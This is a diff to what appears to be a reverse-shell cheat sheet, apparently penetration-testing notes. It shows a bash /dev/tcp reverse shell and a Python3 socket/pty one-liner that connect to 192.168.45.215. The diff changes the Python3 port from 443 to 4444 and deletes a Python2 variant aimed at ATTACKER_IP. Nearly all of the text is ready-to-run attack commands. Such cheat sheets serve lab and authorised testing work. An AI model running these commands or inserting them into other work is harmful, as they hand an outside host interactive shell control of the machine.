@@ -38,12 +38,12 @@ sh -i >& /dev/tcp/192.168.45.215/443 0>&1
 
 ### Python3
 ```bash
-python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.215",443));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
+python3 -c 'import os,pty,socket;s=socket.socket();s.connect(("192.168.45.215",4444));[os.dup2(s.fileno(),f) for f in (0,1,2)];pty.spawn("/bin/bash")'
 ```
 
 ### Python2
 ```bash
-python -c 'import os,pty,socket;s=socket.socket();s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn("/bin/bash")'
+
 ```
 
 ### Perl
